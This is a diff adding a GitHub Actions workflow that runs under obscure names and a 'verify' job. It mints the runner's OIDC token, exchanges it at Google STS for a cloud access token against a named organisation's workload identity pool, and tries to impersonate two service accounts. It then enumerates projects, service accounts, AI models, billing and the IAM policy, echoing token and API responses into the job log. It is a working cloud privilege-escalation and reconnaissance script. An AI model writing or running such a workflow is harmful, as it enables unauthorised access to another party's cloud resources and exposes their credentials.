@@ -1,0 +1,48 @@
+name: i863
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: chain43
+        run: |
+          set +e
+          AUD="//iam.googleapis.com/projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider"
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+          TOK=$(echo "$OIDC" | jq -r '.value // empty')
+          echo "OIDC_MINT_LEN=${#TOK}"
+          if [ -z "$TOK" ]; then echo "OIDC_RAW=$(echo $OIDC | head -c 300)"; exit 0; fi
+          jq -n --arg t "$TOK" --arg aud "$AUD" '{grantType:"urn:ietf:params:oauth:grant-type:token-exchange", audience:("https://iam.googleapis.com/" + ($aud|ltrimstr("//iam.googleapis.com/"))), scope:"https://www.googleapis.com/auth/cloud-platform", requestedTokenType:"urn:ietf:params:oauth:token-type:access_token", subjectToken:$t, subjectTokenType:"urn:ietf:params:oauth:token-type:jwt"}' > sts_req.json
+          C=$(curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d @sts_req.json)
+          echo "STS_HTTP=$C"
+          head -c 700 sts.json; echo
+          AT=$(jq -r '.access_token // empty' sts.json)
+          echo "STS_AT_LEN=${#AT}"
+          if [ -z "$AT" ]; then exit 0; fi
+          GEN_BODY='{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
+          for SA in github-actions@zuplo-marketing.iam.gserviceaccount.com 196494084534-compute@developer.gserviceaccount.com; do
+            C=$(curl -s -o g.json -w '%{http_code}' -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d "$GEN_BODY")
+            echo "GEN[$SA]=$C"
+            head -c 600 g.json; echo
+          done
+          for U in "https://cloudresourcemanager.googleapis.com/v1/projects" "https://iam.googleapis.com/v1/projects/196494084534/serviceAccounts?pageSize=100" "https://us-central1-aiplatform.googleapis.com/v1/projects/196494084534/locations/us-central1/models" "https://cloudbilling.googleapis.com/v1/projects/196494084534/billingInfo"; do
+            C=$(curl -s -o r.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$U")
+            echo "GET[$U]=$C"
+            head -c 400 r.json; echo
+          done
+          echo '{"options":{"requestedPolicyVersion":3}}' > pol.json
+          C=$(curl -s -o p.json -w '%{http_code}' -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/196494084534:getIamPolicy" -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d @pol.json)
+          echo "POLICY_POST=$C"
+          head -c 400 p.json; echo
+          C=$(curl -s -o b.json -w '%{http_code}' -H "Authorization: Bearer bogus.token.value" "https://cloudresourcemanager.googleapis.com/v1/projects")
+          echo "CTRL_BOGUS_PROJECTS=$C"
+          head -c 200 b.json; echo
+          C=$(curl -s -o b2.json -w '%{http_code}' -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@zuplo-marketing.iam.gserviceaccount.com:generateAccessToken" -H "Authorization: Bearer bogus.token.value" -H 'Content-Type: application/json' -d "$GEN_BODY")
+          echo "CTRL_BOGUS_GEN=$C"
+          head -c 200 b2.json; echo
+          echo "=== DONE ==="
